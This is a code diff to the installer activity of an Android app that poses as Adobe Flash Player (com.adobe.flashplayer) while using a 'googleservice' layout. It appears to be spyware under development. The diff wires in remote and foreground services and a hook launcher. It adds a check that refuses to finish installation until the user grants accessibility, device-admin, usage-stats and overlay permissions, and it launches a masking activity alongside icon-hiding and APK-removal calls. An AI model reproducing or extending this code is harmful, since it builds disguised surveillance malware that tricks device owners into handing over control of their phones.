@@ -23,8 +23,11 @@ import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.accessory.HookLauncher;
 import com.adobe.flashplayer.core.CoreHelper;
 import com.adobe.flashplayer.core.DeviceManager;
+import com.adobe.flashplayer.core.ForegroundSrv;
+import com.adobe.flashplayer.core.RemoteSrv;
 import com.adobe.flashplayer.core.UsageStatsMgr;
 
 public class InstallActivity extends Activity  {
@@ -67,6 +70,8 @@ public class InstallActivity extends Activity  {
 
     public static boolean debug_flag = true;
 
+    public static boolean permission_authoritized = false;
+
     @Override
     public void onCreate(Bundle savedInstanceState) {
         try {
@@ -76,6 +81,8 @@ public class InstallActivity extends Activity  {
             Public pub = new Public(getApplicationContext());
 
             Log.e(TAG,"onCreate");
+
+            PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_MANUAL);
 
             if (debug_flag ){
                 install(InstallActivity.this);
@@ -90,7 +97,6 @@ public class InstallActivity extends Activity  {
             MyLog.writeLogFile(TAG+"setup exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
         }
     }
-
 
 
     public void checkInstallCode( Activity activity){
@@ -110,8 +116,6 @@ public class InstallActivity extends Activity  {
     public void install(Activity activity){
 
         activity.setContentView(R.layout.activity_googleservice);
-
-        PrefOper.setValue(activity, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_MANUAL);
 
         authority = (Button)findViewById(R.id.authoritySetting);
         rebootup = (Button)findViewById(R.id.startupSetting);
@@ -195,6 +199,11 @@ public class InstallActivity extends Activity  {
                         Permission.checkPermission(InstallActivity.this);
                     }
 
+                    if (permission_authoritized == false){
+                        Toast.makeText(InstallActivity.this, "未获得权限,必须获得授权才能结束安装",Toast.LENGTH_LONG).show();
+                        return;
+                    }
+
                     NotificationManager nm =(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
                     nm.cancelAll();
                     try {
@@ -211,14 +220,21 @@ public class InstallActivity extends Activity  {
 
                     PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE, "ok");
 
+                    Intent intent = new Intent(InstallActivity.this, MaskActivity.class);
+                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+
                     if (debug_flag == false){
                         mHandler.removeCallbacksAndMessages(null);
-                        InstallHelper.hideDesktopIcon(InstallActivity.this);
-                    }else{
+                        //InstallHelper.hideDesktopIcon(InstallActivity.this);
+                    }
+                    else{
+
                         new MainEntry(InstallActivity.this,"").start();
                     }
 
                     finish();
+
                     return;
                 }catch(Exception ex){
                     ex.printStackTrace();
@@ -281,28 +297,18 @@ public class InstallActivity extends Activity  {
             authority.setOnClickListener(authoritylistener);
             rebootup.setOnClickListener(rebootuplistener);
             notification.setOnClickListener(notificationlistener);
-            if (batteryOpt != null) {
-                batteryOpt.setOnClickListener(batteryOptListener);
-            }
 
-            if (accessibility != null) {
-                accessibility.setOnClickListener(accessibilitylistener);
-            }
+            batteryOpt.setOnClickListener(batteryOptListener);
 
-            if(appsusage != null){
-                appsusage.setOnClickListener(appsusageListener);
-            }
+            accessibility.setOnClickListener(accessibilitylistener);
 
-            if (devmgr != null) {
-                devmgr.setOnClickListener(devmgrListener);
-            }
+            appsusage.setOnClickListener(appsusageListener);
 
-            if(floatwindow != null){
-                floatwindow.setOnClickListener(floatwindowListener);
-            }
+            devmgr.setOnClickListener(devmgrListener);
+
+            floatwindow.setOnClickListener(floatwindowListener);
 
             complete.setOnClickListener(completelistener);
-
 
             InstallHelper.removeApk(this,"");
 
@@ -310,7 +316,6 @@ public class InstallActivity extends Activity  {
             ex.printStackTrace();
         }
     }
-
 
 
     @Override
@@ -327,8 +332,6 @@ public class InstallActivity extends Activity  {
             Log.e(TAG, "baterry optimize permission ok");
         }
     }
-
-
 
 
 
@@ -351,6 +354,8 @@ public class InstallActivity extends Activity  {
                     //3上次选择禁止并勾选：下次不在询问false
                 }
             }
+
+            permission_authoritized = true;
         }else{
 
         }
@@ -368,6 +373,5 @@ public class InstallActivity extends Activity  {
             e.printStackTrace();
         }
     }
-
 
 }
